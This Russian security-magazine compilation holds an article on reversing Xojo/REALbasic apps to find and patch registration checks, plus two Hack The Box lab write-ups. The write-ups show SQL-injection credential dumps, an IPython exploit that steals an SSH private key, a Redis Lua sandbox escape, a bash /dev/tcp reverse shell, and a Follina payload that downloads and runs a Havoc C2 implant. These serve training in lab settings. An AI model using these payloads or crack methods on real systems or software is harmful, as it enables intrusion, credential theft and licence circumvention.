или на него навесили какую‑то особенную защиту, а потому, что разработчики
использовали редкий и малораспространенный фреймворк. Сегодня в нашем
меню — экзотическая среда разработки под названием REALbasic (Xojo).
  Это  один  из  пионеров  кросс‑платформенного  программирования.
REALbasic неоднократно менял название, архитектуру и хозяев и в последнее
время серьезно растерял как свои рыночные позиции, так и актуальность.
Написанные на нем приложения встречаются все реже и реже, в основном
в таких узкоспециализированных областях, как колориметрия. Из‑за малой рас‐
пространенности для него, в отличие от известных сред разработки (вроде
Delphi, .NET или VBS), практически отсутствуют специализированные инстру‐
менты для реверса. Поэтому мы, как обычно, на примере конкретных приложе‐
ний разберем принципы и лайфхаки для изучения кода таких приложений.
   Начнем с самого простого случая. Как ни странно, легче всего исследовать
приложение, созданное в современных актуальных версиях Xojo (да‑да, он
мало того что еще поддерживается, вдобавок стал 64-битным, Википедия
врет).
   Итак, нам попалось графическое приложение, при анализе которого наш
безотказный Detect It Easy (DIE) утверждает, что это Xojo (x64).





Нам понадобится самая малость: включить функции приложения, которые
отказываются работать в незарегистрированной версии, выдавая вместо этого
окошки с требованием регистрации. Загрузив программу в отладчик x64dbg
и притормозив ее в этом месте, мы с облегчением замечаем, что программа
не зашифрована, не упакована и лишена средств антиотладки. Она даже сооб‐
щение выдает стандартным MessageBoxA, при этом программа прекрасно
дизассемблируется при помощи IDA. Полученный код, правда, как и следовало
ожидать от кросс‑платформенного бейсика, чудовищно неуклюж и сложен
для понимания.





Хочется как‑то облегчить себе жизнь, хотя бы восстановив имена вызываемых
методов. Наш предыдущий опыт работы со скомпилированным кодом, изна‐
чально предназначенным под интерпретатор, подсказывает, что эта информа‐
ция где‑то обязательно должна храниться. Просмотрев в IDA все ссылки
на процедуру, из которой была вызвана ошибка демоверсии, находим инте‐
ресную конструкцию:


...
.text:0000000141A85CF5  mov  edx, 0F40h
.text:0000000141A85CFA  xor  r8d, r8d
.text:0000000141A85CFD  lea  rcx, sub_140D7D410
.text:0000000141A85D04  lea  r9, aOBevelbutton_64 ; "%%o<
BevelButton>" — похоже на класс нашего метода
.text:0000000141A85D0B  lea  r10, aBvlmeaschartAc_0 ;
"BvlMeasChart_Action" — похоже на его имя
.text:0000000141A85D12  lea  r11, sub_
141A91350     ; Адрес нашего метода
.text:0000000141A85D19  mov  [rbp+8F0h+var_438], rax
.text:0000000141A85D20  mov  [rbp+8F0h+var_60], r11
.text:0000000141A85D27  mov  rax, [rbp+8F0h+var_8E0]
.text:0000000141A85D2B  mov  [rax+0F68h], r11
.text:0000000141A85D32  mov  r11, [rbp+8F0h+var_68]
.text:0000000141A85D39  mov  [r11+0F40h], r10
.text:0000000141A85D40  mov  r10, [rbp+8F0h+var_68]
.text:0000000141A85D47  mov  [r10+0F60h], r9
.text:0000000141A85D4E  mov  [rbp+8F0h+var_440], rcx
.text:0000000141A85D55  mov  r9, [rbp+8F0h+var_68]
.text:0000000141A85D5C  mov  [r9+0F70h], rcx
.text:0000000141A85D63  mov  rcx, [rbp+8F0h+var_68]
.text:0000000141A85D6A  mov  dword ptr [rcx+0F78h], 39h ; '9'
.text:0000000141A85D74  mov  rcx, [rbp+8F0h+var_68]
.text:0000000141A85D7B  mov  dword ptr [rcx+0F48h], 101h
.text:0000000141A85D85  mov  rcx, [rbp+8F0h+var_68]
.text:0000000141A85D8C  mov  [rbp+8F0h+var_8E8], rcx
.text:0000000141A85D90  call RuntimeAllocateAttributeTable
...

Бегло просмотрев код, обнаруживаем великое множество подобных конструк‐
ций по всему дизассемблированному приложению. Очевидно, что это ини‐
циализация каких‑то внутренних REALbasic-овских таблиц методов. Вероятнее
всего,  за  это  ответственна  функция  RuntimeAllocateAttributeTable
из модуля XojoGUIFramework64.dll,  вызывает  сомнение  только  способ
передачи  параметров.  Вроде  как  строки  и  адреса  перед  вызовом
RuntimeAllocateAttributeTable записываются в стек, однако не в область
параметров, а в область локальных переменных, причем по совершенно раз‐
ным адресам. Попробуем проанализировать еще пару подобных конструкций:


.text:0000000141A85D95  mov  edx, 0F80h             <-- Обрати
внимание, что число в edx 0F80h
.text:0000000141A85D9A  xor  r8d, r8d
.text:0000000141A85D9D  lea  rcx, sub_140D7D410
.text:0000000141A85DA4  lea  r9, aOBevelbutton_65 ; "%%o<
BevelButton>"
.text:0000000141A85DAB  lea  r10, aBvldefchartAct ; "BvlDefChart_
Action"
.text:0000000141A85DB2  lea  r11, sub_141A95B20
.text:0000000141A85DB9  mov  [rbp+8F0h+var_448], rax
.text:0000000141A85DC0  mov  [rbp+8F0h+var_60], r11
.text:0000000141A85DC7  mov  rax, [rbp+8F0h+var_8E8]
.text:0000000141A85DCB  mov  [rax+0FA8h], r11
.text:0000000141A85DD2  mov  r11, [rbp+8F0h+var_68]
.text:0000000141A85DD9  mov  [r11+0F80h],
r10       <-- Везде эквивалентно смещению, по которому сохраняется
адрес строки имени метода
.text:0000000141A85DE0  mov  r10, [rbp+8F0h+var_68]
.text:0000000141A85DE7  mov  [r10+0FA0h], r9
.text:0000000141A85DEE  mov  [rbp+8F0h+var_450], rcx
.text:0000000141A85DF5  mov  r9, [rbp+8F0h+var_68]
.text:0000000141A85DFC  mov  [r9+0FB0h], rcx
.text:0000000141A85E03  mov  rcx, [rbp+8F0h+var_68]
.text:0000000141A85E0A  mov  dword ptr [rcx+0FB8h], 3Ah ; ':'
.text:0000000141A85E14  mov  rcx, [rbp+8F0h+var_68]
.text:0000000141A85E1B  mov  dword ptr [rcx+0F88h], 101h
.text:0000000141A85E25  mov  rcx, [rbp+8F0h+var_68]
.text:0000000141A85E2C  mov  [rbp+8F0h+var_8F0], rcx <--
Относительно адреса в RCX
.text:0000000141A85E30  call RuntimeAllocateAttributeTable

Вот еще один пример. Относительные смещения между адресом метода (1),
именем метода (2) и именем класса (3) в каждой конструкции одинаковы.


.text:00141A85E35  mov  edx, 0FC0h
.text:00141A85E3A  xor  r8d, r8d
.text:00141A85E3D  lea  rcx, sub_140D7D410
.text:00141A85E44  lea  r9, aOBevelbutton_66 ; "%%o<BevelButton>"
.text:00141A85E4B  lea  r10, aBvlgraph2dActi_0 ; "BvlGraph2D_
Action"
.text:00141A85E52  lea  r11, sub_141A95D70
.text:00141A85E59  mov  [rbp+8F0h+var_458], rax
.text:00141A85E60  mov  [rbp+8F0h+var_60], r11
.text:00141A85E67  mov  rax, [rbp+8F0h+var_8F0]
.text:00141A85E6B  mov  [rax+0FE8h], r11       <-- (1)
.text:00141A85E72  mov  r11, [rbp+8F0h+var_68]
.text:00141A85E79  mov  [r11+0FC0h], r10       <-- (2)
.text:00141A85E80  mov  r10, [rbp+8F0h+var_68]
.text:00141A85E87  mov  [r10+0FE0h], r9        <-- (3)
.text:00141A85E8E  mov  [rbp+8F0h+var_460], rcx
.text:00141A85E95  mov  r9, [rbp+8F0h+var_68]
.text:00141A85E9C  mov  [r9+0FF0h], rcx
.text:00141A85EA3  mov  rcx, [rbp+8F0h+var_68]
.text:00141A85EAA  mov  dword ptr [rcx+0FF8h], 3Bh ; ';'
.text:00141A85EB4  mov  rcx, [rbp+8F0h+var_68]
.text:00141A85EBB  mov  dword ptr [rcx+0FC8h], 101h
.text:00141A85EC5  mov  rcx, [rbp+8F0h+var_68]
.text:00141A85ECC  mov  [rbp+8F0h+var_8F8], rcx
.text:00141A85ED0  call RuntimeAllocateAttributeTable

Немного  пораскинув  мозгами, мы  приходим  к  выводу,  что  на  входе
в RuntimeAllocateAttributeTable в  регистре RCX  находится  указатель
на некую таблицу, каждый элемент которой занимает 0x40 байт и имеет при‐
мерно следующую структуру:


DQ MethodName       ;RCX[RDX+0]
DQ ?
DQ ?
DQ ?
DQ ?
DQ ?
DQ ?
DQ ?
DQ ClassName         ;RCX[RDX+20h]
DQ MethodAddress     ;RCX[RDX+28h]
DQ ?
DQ ?
DQ ?
DQ ?
DQ ?
DQ ?

А в регистре RDX хранится относительное смещение на текущий элемент дан‐
ной таблицы в  байтах. В принципе, поковырявшись в коде и отладчике,
при желании можно раскопать сакральный смысл и остальных полей этой таб‐
лицы, но мы не будем отвлекаться: полученной информации нам уже почти
достаточно для дальнейшего исследования структуры кода.
   Итак,     ставим    условную      точку     останова    на    функцию
RuntimeAllocateAttributeTable со следующим текстом журнала:
   ClassName:   {s:[rcx+rdx+0x20]}   MethodName:   {s:[rcx+rdx]}

Address: {[rcx+rdx+0x28]} called at {[rsp]}
   Последний параметр, адрес вызова, нам необходим на всякий случай, что‐
бы отследить место, в котором что‑то пошло не так при вызове. Перезагружа‐
ем программу и — бинго! — в журнале x64dbg видим не идеальный, но отно‐
сительно вменяемый список имен методов с адресами:


...
ClassName: "%%sp" MethodName: "_AddMenuHandler"  Address:
140296DF0 called at 141A84A96
ClassName: "%o<Object>%s" MethodName: "_ControlByName"  Address:
140296E70 called at 141A84B3C
ClassName: "%o<Object>%si8" MethodName: "_ControlByNameIndex"
Address: 140296F60 called at 141A84BE2
ClassName: "%%" MethodName: "_DependencyList"  Address: 140297050
called at 141A84C88
ClassName: "%o<Object>%s" MethodName: "_GetControl"  Address:
140296E70 called at 141A84D1D
ClassName: "%o<Object>%si8" MethodName: "_GetControlArray"
Address: 140296F60 called at 141A84DB2
ClassName: "%%i8i8i8i8" MethodName: "_Move"  Address: 1402970F0
called at 141A84E58
ClassName: "%%" MethodName: "__Exit"  Address: 140297180 called
at 141A84EED
ClassName: "%%" MethodName: "__Init"  Address: 1402971D0 called
at 141A84F82
ClassName: "%o<Object>%p" MethodName: "__New"  Address: 140297240
called at 141A85028
ClassName: "%%" MethodName: "Layout"  Address: 141A86480 called
at 141A850CE
ClassName: "%%" MethodName: "CreateControls"  Address: 140775830
called at 141A85174
ClassName: "%%" MethodName: "_CreateControls0"  Address:
141A86530 called at 141A85216
ClassName: "%o<BevelButton>%" MethodName: "BvlPaper"  Address:
141A8A830 called at 141A852E6
ClassName: "%o<BevelButton>%" MethodName: "BvlMetamerism"
Address: 141A8A9F0 called at 141A8538C
ClassName: "%o<BevelButton>%" MethodName: "BvlGamut"  Address:
141A8ABB0 called at 141A85432
ClassName: "%o<BevelButton>%" MethodName: "BvlMeasSpec"  Address:
141A8AD70 called at 141A854D5
ClassName: "%o<BevelButton>%" MethodName: "BvlMeasChart"  Address:
 141A8AF30 called at 141A85575
ClassName: "%o<BevelButton>%" MethodName: "BvlDefChart"  Address:
141A8B0F0 called at 141A85615
ClassName: "%o<BevelButton>%" MethodName: "BvlGraph2D"  Address:
141A8B2B0 called at 141A856B5
ClassName: "%o<BevelButton>%" MethodName: "BvlLight"  Address:
141A8B470 called at 141A85755
ClassName: "%o<BevelButton>%" MethodName: "BvlCalculate"  Address:
 141A8B630 called at 141A857F5
ClassName: "%o<BevelButton>%" MethodName: "BvlDifference"
Address: 141A8B7F0 called at 141A85895
ClassName: "%o<BevelButton>%" MethodName: "BvlSearch"  Address:
141A8B9B0 called at 141A85935
ClassName: "%o<BevelButton>%" MethodName: "BvlMakeLightSource"
Address: 141A8BB70 called at 141A859D5
ClassName: "%o<BevelButton>%" MethodName: "BvlMakeChartImage"
Address: 141A8BD30 called at 141A85A75
...

К сожалению, суть этого метода состоит в том, что он чисто динамический, то
есть нельзя получить список имен просто из дизассемблера, не запустив прог‐
рамму. Но если тебя вдруг настигнет приступ перфекционизма, можно просто
распарсить этот список и скриптом расставить в IDA или x64dbg метки с име‐
нами методов по нужным адресам.
  Нам же некогда отвлекаться на подобные мелочи. Пока вполне достаточно
того, что при заходе в каждую процедуру, которую IDA не детектит как стандар‐
тную бейсиковскую, мы можем найти ее имя по адресу в полученном списке.
Если, конечно, она там вообще находится. В любом случае у нас уже есть неп‐
лохой инструмент, благодаря которому за десять минут работы с отладчиком
и IDA мы обнаруживаем и патчим все проверки на жадность в программном
модуле и готовы продолжать дальнейшее знакомство с особенностями Xojo.
   Чтобы немного усложнить себе жизнь, рассмотрим чуть более старый, 32-
битный вариант REALbasic. Итак, у нас есть другая программа,  загрузка
которой в DIE показывает следующее окошко.





Казалось бы, 32-битная версия Xojo должна быть проще, ан нет. Загрузив при‐
ложение в IDA, мы с удивлением обнаруживаем практически полное отсутствие
кода и импорта при внушительном размере EXE-модуля.





Разгадка проста: практически весь EXE-модуль состоит из огромного оверлея,
который подгружается на произвольные адреса во время загрузки программы.
А значит, даже дампить для изучения уже загруженный модуль особого смысла
нет, хотя сама программа не мешает ни отладке, ни дампу. Погуглив, обна‐
руживаем, что более старую версию нашего фреймворка народ уже изучал
и даже запилил на ее основе питоновский скрипт под IDA, который парсит
оверлей.
   Желающие могут ознакомиться с этим скриптом самостоятельно, я же
не  стану  останавливаться на нем подробно,  поскольку скрипт на нашем
модуле не работает, а структура оверлея немного отличается от описанной
в упомянутой статье. Будь у нас в запасе побольше времени, мы бы могли
разобрать новую структуру по винтикам, понять, что изменилось, и создать
на основе старого новый работоспособный скрипт, поддерживающий наш
формат. Но мы пойдем другим путем.
   Помнишь, как мы выкрутились в случае 64-битной версии? Повесили бряк
на     функцию     RuntimeAllocateAttributeTable     из     модуля
XojoGUIFramework64.dll и ловили им  инициализацию  каждого метода.
Разумеется, при загрузке в отладчик программы в ней нет никакого импорта,
кроме нескольких базовых функций kernel32, необходимых для загрузки овер‐
лея. Однако, прервавшись в отладчике внутри уже загруженной программы,
мы  видим  необходимый  модуль  в  списке —  здесь  он  называется
XojoGUIFramework32.dll,        и         необходимая         функция
RuntimeAllocateAttributeTable там есть.
   Ставим на нее бряк и перезагружаем программу в отладчике. Бряк стопит‐
ся   уже   при   вызове   из   загруженного    оверлея,   код   вызова
RuntimeAllocateAttributeTable до боли похож на аналогичный из 64-бит‐
ного модуля. Поскольку мы уже в курсе, как все было устроено там, нам
не составит большого труда придумать аналогию для каждого нужного нам
поля:


0197FCA6 mov esp,dword ptr ss:[ebp-E4]
0197FCAC mov dword ptr ss:[ebp-D0],eax
0197FCB2 mov ecx,198074F
0197FCB7 mov dword ptr ss:[ebp-58],ecx
0197FCBA mov edx,dword ptr ss:[ebp-50]
0197FCBD mov dword ptr ds:[edx+248],ecx
0197FCC3 mov ebx,1AA2296                   <-- Адрес класса
0197FCC8 mov dword ptr ss:[ebp-58],ebx
0197FCCB mov dword ptr ds:[edx+250],ebx
0197FCD1 mov ecx,377907D                   <-- Имя метода
0197FCD6 mov dword ptr ds:[edx+258],ecx
0197FCDC mov esi,3774A0C                   <-- Имя класса
0197FCE1 mov dword ptr ds:[edx+268],esi
0197FCE7 xor edi,edi
0197FCE9 mov dword ptr ds:[edx+26C],edi
0197FCEF mov esi,11
0197FCF4 mov dword ptr ds:[edx+25C],esi
0197FCFA push eax
0197FCFB push 0
0197FD00 push
258                          <-- Смещение до элемента таблицы
0197FD05 push edx                          <-- Адрес таблицы
0197FD06 call <xojoguiframework32.RuntimeAllocateAttributeTable>

Судя по всему, эта структура в 32-битном исполнении занимает 0x28 байт
и состоит из десяти полей. Несложно переделать текст журнала в условной
точке останова под новую информацию. Что я и предлагаю читателю сделать
самостоятельно.
ВЗЛОМ

       HTB
 SHARED





      ПОВЫШАЕМ ПРИВИЛЕГИИ
      ЧЕРЕЗ УЯЗВИМОСТЬ В REDIS





В этом райтапе я покажу, как повысить
привилегии через Redis. Но сначала мы
проникнем на хост при помощи SQL-инъ‐
екции и получим  аккаунт  другого  поль‐
зователя с помощью уязвимости в IPython.             RalfHacker                                                                                          hackerralf8@gmail.com

Тренироваться будем на средней по сложности машине Shared с площадки
Hack The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.172    shared.htb

И запускаем сканирование портов.


Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

Видим всего два открытых порта:
 • 22 — служба OpenSSH 8.4p1;
 • порты 80 и 443 — веб‑сервер Nginx 1.18.0.

Начнем с сайта. Порт 80 нас перекидывает на 443. В результатах скана
находим поле сертификата commonName, он действителен для любого под‐
домена shared.htb.





                    Главная страница сайта http://shared.htb


ТОЧКА ВХОДА
Это сайт какого‑то интернет‑магазина. Попробуем совершить покупку.





                            Корзина пользователя

При попытке перейти к оплате нас кидает на другой поддомен.



                     Новый поддомен после редиректа

Добавим его в /etc/hosts и повторим действия.


10.10.11.172    shared.htb checkout.shared.htb





                          Страница оплаты товара

В Burp History при анализе запросов мы видим название параметра Cookie
PrestaShop. PrestaShop — это опенсорсный движок для интернет‑магазинов.
Он написан на PHP и фреймворке Symfony, для шаблонов используется Twig,
для хранения данных — MySQL.





                            Запрос в Burp History

Я нашел в интернете несколько готовых эксплоитов, но в данном случае они
неприменимы. Поэтому я решил обратить внимание на то, что данные между
двумя сайтами — магазином и платежным сервисом — передаются в заголов‐
ке Cookie.





                             Декодирование Cookie

Я попробовал несколько разных нагрузок и определил, что здесь возможна
SQL-инъекция. Отправляем запрос, условие которого всегда истина, и получа‐
ем товар в чеке.


# Нагрузка
' or 1=1 -- -





                             Проверка SQL-инъекции


ТОЧКА ОПОРЫ
SQL Injection
Давай теперь проэксплуатируем SQL-инъекцию. Сначала определим число
столбцов. Для этого используем UNION с переменным количеством столбцов.
Так, при объединении с таблицей, имеющей один или два столбца, будет
ошибка, а при трех столбцах — внятный вывод.


union select 1 -- -
union select 1,2 -- -
union select 1,2,3 -- -





                     Определение количества столбцов

Так как в вывод попадает второй столбец, основную нагрузку будем посылать
вместо цифры 2. Теперь нам нужно получить название базы данных.


union select 1,database(),3 -- -





                       Название текущей базы данных

Затем выводим текущую базу данных, что дает нам возможность с помощью
служебной базы information_schema и таблицы tables получить названия
таблиц. Чтобы вывести несколько строк в одну, нам нужно их объединить
с помощью функции group_concat.


union select 1,group_concat(table_name),3 from information_schema.
tables where table_schema='checkout' -- -





                       Список таблиц в базе checkout

Теперь логично получить названия столбцов. Запросим записи из таблицы
columns базы information_schema.


union select 1,group_concat(column_name),3 from information_schema
.columns where table_name='user' -- -





                       Список столбцов в таблице user

Имя пользователя и пароль — как и заказывали. В group_concat объединим
учетные данные через символ :.


union select 1,group_concat(username, ':', password),3 from
checkout.user -- -





             Получение учетных данных пользователя james_mason

Есть хеш, а значит, отправляемся к онлайновой базе CrackStation , которая
поможет нам сбрутить пароль.



                      Пароль пользователя james_mason

С полученной парой из логина и пароля можем попробовать авторизоваться
по SSH.



                     Сессия пользователя james_mason

Получилось!


ПРОДВИЖЕНИЕ
Теперь, когда мы получили доступ к хосту, нам нужно собрать информацию. Я
для этого использую скрипты PEASS.


Справка: скрипты PEASS для Linux (загрузка через SCP)
Что делать после того, как мы получили доступ в систему от имени пользовате‐
ля? Вариантов дальнейшей эксплуатации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно использовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.


Загрузим на локальный хост скрипт для Linux, дадим право на выполнение
chmod  +x  linpeas.sh и выполним. В выводе будет много информации,
но меня заинтересовало то, что есть файл, доступный для записи группе раз‐
работчиков, в которой мы состоим.




                       Файлы, доступные для записи

Ничего полезного тут нет, поэтому продолжим разведку и отследим запус‐
каемые процессы. Для этого я рекомендую pspy64 . Загрузим его на хост тем
же способом, что и linpeas, а потом выполним. В выводе отмечаем запуск
ipython из найденного ранее каталога. Что более интересно, он запускается
в контексте пользователя с UID 1001.





                          Вывод утилиты pspy64

Определить  целевого  пользователя  можно  через  файл  /etc/passwd.
Это dan_smith.




                      Содержимое файла /etc/passwd

Порывшись в интернете, я нашел  эксплоит для IPython! Он произвольно
выполняет в текущем каталоге файл profile_default/startup/foo.py.
   Создадим его по нужному пути:


/opt/scripts_review/profile_default/startup/foo.py

И положим внутрь такую строчку:


import os; os.system("cat /home/dan_smith/.ssh/id_rsa > /dev/shm/
key")

Так мы попробуем сохранить приватный ключ пользователя в файл /dev/shm/
key. Периодически проверяем, не появился ли он, и через какое‑то время
получаем ключ.





                         Приватный ключ пользователя

Подключаемся по SSH и забираем первый флаг.




                        Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Снова используем PEASS и с его помощью обнаруживаем следующее.
 • В системе есть приложение redis_connector_dev , доступное группе
   sysadmin, членом которой является наш пользователь.



                    Файлы рута, доступные для чтения

 • В списке прослушиваемых портов есть порт службы Redis — 6379.





                           Список открытых портов

Если выполнить найденное приложение, то увидим, что оно подключается
к серверу, а значит, внутри у него нужные учетные данные.





                Выполнение приложения redis_connector_dev

Скопируем файл на локальный хост с помощью SSH.


scp -i id_rsa dan_smith@shared.htb:/usr/local/bin/redis_connector_
dev ./

Затем откроем листенер на порте 6379, чтобы отобразить полученные дан‐
ные. А когда все будет готово, запустим приложение.





                              Запуск приложения





                                  Логи листенера

В последней строке логов видим пароль для подключения к Redis.


Redis RCE
Redis — резидентная система управления базами данных класса NoSQL
с открытым исходным кодом, работающая со  структурами  данных типа
«ключ — значение». Используется как для баз данных, так и для реализации
кешей, брокеров сообщений. Из последних уязвимостей я вспомнил CVE-
2022-0543 . Дело в том, что из‑за проблемы с упаковкой СУБД Redis под‐
вержена выходу из песочницы Lua, а это может привести к удаленному выпол‐
нению кода (RCE). В данном случае еще и с высокими привилегиями.
   Подключимся к Redis и авторизуемся:


redis-cli
auth F2WHqJUz2WEz= Gqq

Теперь попробуем с помощью следующей нагрузки выполнить команду id.


eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/
liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.
popen("id", "r"); local res = f:read("*a"); f:close(); return res'
0



                           Выполнение команды id

Команда выполнена, и, как мы видим, в контексте пользователя root. Теперь
запустим реверс‑шелл:


bash -i >& /dev/tcp/10.10.14.84/4321 0>&1

Я записал его в файл /dev/shm/r.sh.
   Перед выполнением активируем листенер: pwncat_cs -lp 4321.


eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/
liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.
popen("cat /dev/shm/r.sh | bash", "r"); local res = f:read("*a");
f:close(); r
eturn res' 0





                            Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
 OUTDATED





      ПОВЫШАЕМ ПРИВИЛЕГИИ
      ЧЕРЕЗ СЛУЖБУ ОБНОВЛЕНИЯ
            WINDOWS





В этом райтапе я покажу, как эксплуати‐
ровать  нашумевшую  уязвимость MSTD
Follina, затем позлоупотребляем правом
AddKeyCredentialLink на  учетную запись,
а при повышении привилегий поработаем             RalfHacker                                                                                          hackerralf8@gmail.com
со службой WSUS. Для удобства исполь‐
зуем недавно опубликованный C2-фрей‐
мворк Havoc.


Площадкой для упражнений нам послужит тренировочная машина Outdated
с площадки Hack The Box. Ее уровень сложности оценен как средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.175    outdated.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

Мы нашли много открытых портов, что типично для Windows:
 • 25 — служба SMTP (почтовый сервер);
 • 53 — служба DNS;
 • 88 (фильтруется) — служба Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC). Используется
   для операций взаимодействия контроллер — контроллер и контроллер —
    клиент;
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 (фильтруется) — служба LDAP;
 • 445 — служба SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) (фильтруется) — для доступа к Global Catalog от клиента к кон‐
   троллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 (фильтруется) — служба удаленного управления WinRM;
 • 8530, 8531 (фильтруется) — служба WSUS для обновлений операционных
   систем и продуктов Microsoft;
 • 9389 (фильтруется) — веб‑службы AD DS.

Порты 22 и 636 открывают нам новые доменные имена, которые добавим
в файл /etc/hosts:


10.10.11.175 outdated.htb dc.outdated.htb mail.outdated.htb


ТОЧКА ВХОДА
Первым делом необходимо проверить, нет ли анонимного доступа к службе
SMB. Для этого авторизуемся от имени пользователя guest с пустым паролем.
С помощью утилиты CrackMapExec с параметром --shares можем сразу
получить доступные общие ресурсы.


crackmapexec smb 10.10.11.175 -u 'guest' -p '' --shares





                        Доступные общие ресурсы

Получаем список общих ресурсов и отмечаем для себя доступный для чтения
каталог Shares. Для работы с ресурсом SMB будем использовать smbclient
из пакета скриптов impacket.


impacket-smbclient guest@dc.outdated.htb
use shares
ls





                       Содержимое каталога shares

Находим всего один документ, который забираем на свой хост командой get
NOC_Reminder.pdf.





                 Содержимое документа NOC_Reminder.pdf

Это отчет, который предоставляет нам список текущих уязвимостей (не факт,
что  закрытых).  Также  говорится,  что мы  можем  прислать  на  адрес
itsupport@outdated.htb ссылку на уязвимое приложение. В списке отмечаем
недавно нашумевшую уязвимость CVE-2022-30190 , она же Follina.


ТОЧКА ОПОРЫ
Воспользуемся готовым эксплоитом , но так как нам нужна ссылка на саму наг‐
рузку, а не документ, содержащий ее, то внесем одно изменение. Найдем
в исходном коде нагрузку и изменим ее на команду, которая скачает исполня‐
емый файл и затем запустит.


Invoke-WebRequest http://10.10.14.24:8080/demon.exe -OutFile C:\\
Windows\\Tasks\\demon.exe; C:\\Windows\\Tasks\\demon.exe




                        Измененный код эксплоита

Теперь запустим файл follina.py, содержащий и нагрузку, и веб‑сервер,
и листенер. Но вместо netcat мы будем использовать нагрузку Havoc.


python3 follina.py --interface tun0 --port 8000 --reverse 4321





                                Запуск follina.py

А теперь перейдем  к  фреймворку Havoc.  Собрать и  клиент, и  сервер
из исходников очень легко. Сперва установим необходимые пакеты.


sudo apt install -y git build-essential apt-utils cmake
libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev
libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev
libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-
dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools
libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-
go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev
libboost-all-dev mingw-w64 nasm

Теперь скачиваем сам проект и собираем сначала клиент, потом сервер.


git clone https://github.com/HavocFramework/Havoc.git


#build client
cd Havoc/Client
make
cd ../..


#build server
cd Havoc/Teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
./Install.sh
make

Теперь внесем изменение в файл Havoc/Teamserver/profiles/havoc.yaotl,
где указываем настройки сервера, а также пользователей для подключения.


Teamserver {
    Host = "0.0.0.0"
    Port = 9898
    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/
x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}


Operators {
    user "ralf" {
        Password = "password"
    }
}

Когда все готово, запускаем клиент как Havoc/Client/Havoc и сервер:


./teamserver server --profile ./profiles/havoc.yaotl

Затем создаем HTTPS-листенер и генерируем нагрузку в формате .exe.





                           Создание листенера





                            Создание нагрузки

В каталоге, где расположена нагрузка, запустим простой веб‑сервер:


python3 -m http.server 8080

Затем отправляем письмо.


swaks --to itsupport@outdated.htb --from ralf@ralf --server mail.
outdated.htb --body "http://10.10.14.24:8000/"





                               Отправка сообщения

Машина с багами, поэтому засылать приходилось по нескольку раз, а то и с
ревертом самой машины. Но все же отстук получить удалось.



                               Сессии Havoc


shell whoami




                       Результат выполнения команды whoami


ПРОДВИЖЕНИЕ
Теперь нам нужно понять, куда двигаться дальше. Для этого мы используем
очень крутую программу — BloodHound. В ней используется теория графов
для выявления скрытых и часто непреднамеренных взаимосвязей в среде
Active Directory. BloodHound можно использовать, чтобы идентифицировать
очень сложные пути атаки, которые иначе было бы невозможно быстро иден‐
тифицировать.


BloodHound
Так как у нас нет учетных данных пользователя домена, нам предстоит исполь‐
зовать версию программы на C# на целевом хосте. Благо Havoc позволяет
выполнять сборки .NET прямо в памяти без загрузки исполняемого файла
на хост. Для этого используем команду dotnet inline-execute. После чего
скачиваем файл с собранной информацией на командный сервер командой
download.


dotnet inline-execute /home/ralf/tools/SHARP/Discovery/SharpHound.
exe -c All

Скачанные файлы можно будет найти в хранилище Havoc.





                              Хранилище Havoc

